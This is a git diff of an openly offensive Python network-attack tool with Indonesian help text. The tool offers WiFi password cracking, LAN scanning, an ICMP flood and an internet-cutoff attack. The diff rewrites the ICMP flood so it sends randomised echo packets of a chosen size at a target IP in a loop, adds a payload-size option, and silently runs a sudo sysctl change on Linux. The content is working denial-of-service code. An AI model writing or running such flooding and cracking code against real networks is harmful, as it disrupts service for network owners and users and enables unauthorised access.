@@ -4,7 +4,7 @@ from pywifi import const
 from pywifi import Profile
 from scapy.all import *
 from mac_vendor_lookup import MacLookup, VendorNotFoundError
-import time, argparse, os, pyfiglet, socket, struct, random
+import time, argparse, os, pyfiglet, socket, struct, random, platform
 from termcolor import colored
 
 def cracking(ssid, wordlist):
@@ -107,33 +107,38 @@ def checksum(data):
     for i in range(0, len(data) - n, 2):
         s += (data[i] << 8) + data[i+1]
     if n:
-        s += data[-1] << 8
+        s += (data[-1] << 8)
     while s >> 16:
         s = (s & 0xFFFF) + (s >> 16)
     return ~s & 0xFFFF
 
-def create_icmp_packet(id, seq, size):
-    type = 8  # Echo request
+def create_icmp_header(id, seq, payload):
+    icmp_type = 8  # Echo request
     code = 0
-    checksum_val = 0
-    header = struct.pack("!BBHHH", type, code, checksum_val, id, seq)
-    payload = os.urandom(size)
-    checksum_val = checksum(header + payload)
-    header = struct.pack("!BBHHH", type, code, checksum_val, id, seq)
-    return header + payload
+    chksum = 0
 
-def icmp_attack(ip, loop):
-    bytes = os.urandom(1024)
-    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
-    sock.setsockopt(socket.SOL_IP, socket.IP_TTL, 64)
-    pkt_id = os.getpid() & 0xFFFF
-    size = 56
+    id = id & 0xFFFF
+    seq = seq & 0xFFFF
 
+    header = struct.pack('!BBHHH', icmp_type, code, chksum, id, seq)
+    chksum = checksum(header + payload)
+    return struct.pack('!BBHHH', icmp_type, code, chksum, id, seq)
+
+def icmp_attack(ip, loop, pay):
+    if platform.system() == 'Linux':
+       os.system('sudo sysctl -w net.ipv4.ping_group_range="0 2147483647"')
+       
+    payload_size = int(pay)
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_ICMP)
+    seq = 0
+    
     for x in range(int(loop)):
-        pkt = create_icmp_packet(pkt_id, x, size)
-        sock.sendto(bytes, (ip, 0))
-        print('paket terkirim:' ,x)
-        time.sleep(0.0010)
+      payload = os.urandom(payload_size)
+      icmp_header = create_icmp_header(1234, seq, payload)
+      packet = icmp_header + payload
+      sock.sendto(packet, (ip, 1))
+      seq = (seq + 1) & 0xFFFF 
+      print("Mengirim ICMP Paket, Loop:" ,x)
         
 def split_ip(ip):
     return ip.rsplit('.', 1)[0] + "."
@@ -241,7 +246,7 @@ def main():
  print()
  print("Untuk ICMP Flood:")
  print("Untuk scan LAN IP: python3 run.py --c scan_ip --g GATEWAY_IP")
- print("Untuk melakukan serangan ICMP : python3 run.py --c icmp_attack --ip TARGET_IP --loop JUMLAH_PAKET_DIKIRIM")
+ print("Untuk melakukan serangan ICMP : python3 run.py --c icmp_attack --ip TARGET_IP --loop JUMLAH_PAKET_DIKIRIM --pay JUMLAH_PAYLOAD")
  print()
  print("Untuk Stop Internet:")
  print("Untuk melakukan serangan: python3 run.py --c stop_internet --g GATEWAY --i INTERFACE --m MODE --p IP 3 DIGIT PERTAMA .255 ex(192.168.1.255)")
@@ -255,7 +260,7 @@ def main():
  parser.add_argument('--i', help='Interface atau hardware penghubung')
  parser.add_argument('--m', help='pilih mode untuk stop internet')
  parser.add_argument('--p', help='pdst untuk stop internet')
- parser.add_argument('--l', help='untuk limit bandwidth')
+ parser.add_argument('--pay', help='untuk kirim payload')
  parser.add_argument("--c", choices=['scan_wifi_lists', 'crack_wifi_password', 'scan_ip', 'icmp_attack', 'stop_internet'], help="Aksi yang ingin dilakukan")
  args = parser.parse_args()
 
@@ -266,7 +271,7 @@ def main():
  elif args.c == 'scan_ip':
   scan_ip(args.g)
  elif args.c == 'icmp_attack':
-  icmp_attack(args.ip, args.loop)
+  icmp_attack(args.ip, args.loop, args.pay)
  elif args.c == 'stop_internet':
   ip_range = change_ip(args.g)
   gateway_ip = args.g
